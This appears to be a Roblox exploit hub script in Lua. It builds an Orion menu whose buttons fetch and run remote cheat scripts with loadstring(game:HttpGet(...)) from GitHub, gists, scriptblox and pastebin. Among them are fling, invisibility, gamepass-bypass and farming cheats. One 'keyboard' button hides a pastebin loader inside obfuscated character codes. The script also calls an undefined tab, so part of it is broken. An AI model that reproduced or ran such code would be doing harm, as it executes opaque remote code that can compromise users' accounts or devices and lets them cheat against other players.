local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Infinite ∞", HidePremium = false, IntroText = "Infinite ∞" ,InSaveConfig = true, ConfigFolder = "Infinite ∞"})

local q = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local w = Window:MakeTab({
	Name = "Slap battles",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Tab = Window:MakeTab({
	Name = "Support",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Tab4 = Window:MakeTab({
	Name = "TSBG",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Tab6 = Window:MakeTab({
	Name = "Misc",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Tab7 = Window:MakeTab({
	Name = "Creator",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

---Tab---

Tab4:AddButton({
	Name = "TSBG By Earth Hub",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/l0ckerV5/Roblox-Exploits/main/Earth-Hub"))();
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "TSBG [KJ (WARNING BANNED)",
	Callback = function()
	getgenv().KJ = true

loadstring(game:HttpGet("https://github.com/l0ckerV5/Roblox-Scripts/raw/main/The%20Strongest%20Battlegrounds/Custom%20Character/KJ%20Admin"))()
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Skibidi Toilet Character",
	Callback = function()
loadstring(game:HttpGet("https://github.com/l0ckerV5/Roblox-Scripts/raw/main/The%20Strongest%20Battlegrounds/Custom%20Character/Skibidi%20Toilet"))()
      		print("button pressed")
  	end    
})

w:AddButton({
	Name = "Slap Battles Hub",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Slap_Battles/main/Slap_Battles.lua"))()
      		print("button pressed")
  	end    
})

w:AddButton({
	Name = "Farm slaps",
	Callback = function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/minh152680/f1e3c2bb0a6de398e8914a881f9bb7bc/raw/8e43c0c4e58dcbcbdc8d8b9c06400e363cbc5b05/gistfile1.txt"))()
      		print("button pressed")
  	end    
})

w:AddButton({
	Name = "Invisible",
	Callback = function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
 
if character.isInArena.Value == false then
fireclickdetector(game.Workspace.Lobby.Ghost.ClickDetector)
game:GetService("ReplicatedStorage").Ghostinvisibilityactivated:FireServer()
 
while character.Humanoid.Health ~= 0 do
character.Head.Transparency = 0.5
character.Torso.Transparency = 0.5
character["Left Arm"].Transparency = 0.5
character["Right Arm"].Transparency = 0.5
character["Left Leg"].Transparency = 0.5
character["Right Leg"].Transparency = 0.5
wait(0.05)
end
end
      print("button pressed")
  	end 
})

AntiAfk = Tab:AddToggle({
	Name = "Anti Afk",
	Default = false,
	Callback = function(Value)
	_G.AntiAfk = Value
for i,v in next, getconnections(game.Players.LocalPlayer.Idled) do
if _G.AntiAfk then
v:Disable()
else
v:Enable()
end
end
	end    
})

Tab:AddButton({
	Name = "Inf yield Delta",
	Callback = function()
					loadstring(game:HttpGet("https://gist.githubusercontent.com/lxnnydev/c533c374ca4c1dcef4e1e10e33fa4a0c/raw/03e74f184f801dad77d3ebe1e2f18c6ac87ca612/delta___IY.gistfile1.txt.lua",true))()
        print("button pressed")
    end 
})

Tab6:AddButton({
	Name = "Piggy"
	,Callback = function()
loadstring(game:HttpGet("https://scriptblox.com/raw/Piggy-V2-BY-ME-14442"))()
			print("button pressed")
		end
})
Tab:AddButton({
	Name = "Drop Item [one time]",
	Callback = function()
game:GetService("VirtualInputManager"):SendKeyEvent(true,"Backspace",false,x)
					print("button pressed")
		end    
})

Tab:AddButton({
	Name = "Shiftlock",
	Callback = function()
loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Permanent-Shiftlock-V2-14049"))()
					print("button pressed")
		end    
})

Tab6:AddButton({
	Name = "The Fe Lag",
	Callback = function()
while true do
	game.Players.LocalPlayer.Character.Torso.Anchored = true
	game.Players.LocalPlayer.Character.Humanoid.Jump = true
	wait(0.1)
	game.Players.LocalPlayer.Character.Torso.Anchored = false
	game.Players.LocalPlayer.Character.Humanoid.Sit = true
	wait(0.1)
end
		    print("button pressed")
  	end
})

Tab6:AddButton({
	Name = "Build A Boat For Treasure",
	Callback = function()
loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Rolly-Hub-I-6-GAMES-SUPPORTED-4511"))()
					print("button pressed")
		end    
})


Tab:AddButton({
	Name = "Fe Fly V3",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Fly_V3.lua"))()
			   print("button pressed")
  	end    
})

Tab6:AddButton({
	Name = "Fling Gui",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt"))()
      		print("button pressed")
  	end    
})

Tab6:AddButton({
	Name = "Funky Friday autoplay",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadir3709/RandomScript/main/FunkyFridayMobile"))()
      		print("button pressed")
  	end    
})

Tab6:AddButton({
	Name = "Server Gui",
	Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Server-Browser_80"))()
      		print("button pressed")
  	end    
})

Tab6:AddButton({
	Name = "Universal all Gamepass",
	Callback = function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/6982de484735e730494b2d5a10fd6a2a/raw/a92563b0cd6a63683341a09f54baccea5349ed69/feGamepassV2",true))()
      		print("button pressed")
  	end    
})

Tab6:AddButton({
	Name = "The maze",
	Callback = function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/minh152680/008064fa5e0edada896aa0fa9b539146/raw/b40bee9980152a8232ad150c034493dd9c340773/The%2520mazee.lua"))()
      		print("button pressed")
  	end    
})

Tab6:AddButton({
	Name = "pendu(yea👀)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()
      		print("button pressed")
  	end    
})

Tab6:AddButton({
	Name = "Boombox",
	Callback = function()
_G.boomboxb = game:GetObjects('rbxassetid://740618400')[1]
_G.boomboxb.Parent = game:GetService'Players'.LocalPlayer.Backpack
loadstring(_G.boomboxb.Client.Source)() 
loadstring(_G.boomboxb.Server.Source)()
      		print("button pressed")
  	end    
})

Tab6:AddButton({
	Name = "F3X",
	Callback = function()
loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
      		print("button pressed")
  	end    
})

Tab6:AddButton({
	Name = "Break In 2 [GAMEPASS]",
	Callback = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/RScriptz/RobloxScripts/main/BreakIn2.lua"))()
      		print("button pressed")
  	end    
})

Tab3:AddButton({
	Name = "keyboard",
	Callback = function()
SGTSOBF_wwwwwWwWw={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\112","\97","\115","\116","\101","\98","\105","\110","\46","\99","\111","\109","\47","\114","\97","\119","\47","\117","\85","\81","\105","\54","\57","\49","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_RRRrRrrRR="";for _,SGTSOBF_lLLLLllll in pairs(SGTSOBF_wwwwwWwWw)do SGTSOBF_RRRrRrrRR=SGTSOBF_RRRrRrrRR..SGTSOBF_lLLLLllll;end;SGTSOBF_gGGGggggG=function(SGTSOBF_lLllLlLLL)loadstring(SGTSOBF_lLllLlLLL)()end;SGTSOBF_gGGGggggG(SGTSOBF_RRRrRrrRR)
      		print("button pressed")
  	end    
})

Tab7:AddLabel("Creator: minh152680")
q:AddLabel("Hello human")
q:AddLabel("Thanks for using my script")
q:AddLabel("enjoy")

OrionLib:Init()
